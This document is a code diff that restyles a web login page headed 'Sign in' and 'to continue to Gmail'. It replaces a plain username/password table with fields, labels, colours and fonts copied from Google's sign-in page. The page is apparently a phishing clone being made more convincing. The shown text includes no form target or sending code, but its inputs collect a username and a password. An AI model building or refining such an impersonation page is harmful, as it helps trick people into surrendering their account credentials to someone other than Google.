@@ -19,18 +19,18 @@
         }
         
         header {
-            padding: 20px;
+            padding: 8px;
             display: flex;
             justify-content: flex-end;
             align-items: center;
+            gap: 15px;
         }
         
         .nav-link {
-            color: #000;
+            color: rgba(0,0,0,.87);
             text-decoration: none;
-            margin-left: 15px;
-            padding: 10px;
             font-size: 13px;
+            padding: 8px;
         }
         
         .nav-link:hover {
@@ -66,8 +66,9 @@
         .login-form {
             border: 1px solid #dadce0;
             border-radius: 8px;
-            padding: 40px 40px 50px;
-            margin-bottom: 26px;
+            padding: 48px 40px 36px;
+            margin: 50px auto;
+            width: 450px;
         }
         
         h1 {
@@ -82,7 +83,12 @@
             margin-bottom: 24px;
         }
         
-        input[type="email"], input[type="password"] {
+        .input-field {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
+        .input-text {
             width: 100%;
             height: 54px;
             padding: 13px 15px;
@@ -90,6 +96,29 @@
             border-radius: 4px;
             font-size: 16px;
             outline: none;
+        }
+        
+        .input-text:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        
+        label {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+        
+        .input-text:focus + label,
+        .input-text:not(:placeholder-shown) + label {
+            font-size: 12px;
+            top: -8px;
+            background: white;
+            padding: 0 4px;
         }
         
         input[type="email"]:focus, input[type="password"]:focus {
@@ -129,7 +158,7 @@
         }
         
         .next-btn {
-            display: block;
+            width: 100%;
             background-color: #1a73e8;
             color: #fff;
             border: none;
@@ -137,8 +166,10 @@
             border-radius: 4px;
             font-size: 14px;
             font-weight: 500;
-            margin: 0 auto;
+            margin-top: 20px;
             cursor: pointer;
+            height: 36px;
+            font-family: 'Google Sans', Arial, sans-serif;
         }
         
         .next-btn:hover {
@@ -209,16 +240,16 @@
             <h1>Sign in</h1>
             <h2 style="text-align: center; font-size: 16px; font-weight: 400; color: #202124; margin-bottom: 20px;">to continue to Gmail</h2>
             
-            <table>
-                <tr>
-                    <td>Username : </td>
-                    <td><input name="uname" type="text" size="20"></td>
-                </tr>
-                <tr>
-                    <td>Password : </td>
-                    <td><input name="pass" type="password" size="20"></td>
-                </tr>
-            </table>
+            <div class="input-field">
+                <input name="uname" type="text" class="input-text" autocomplete="username" required>
+                <label>Email or phone</label>
+            </div>
+            
+            <div class="input-field">
+                <input name="pass" type="password" class="input-text" autocomplete="current-password" required>
+                <label>Enter your password</label>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
             
             <a href="#" class="forgot-email">Forgot email?</a>
             
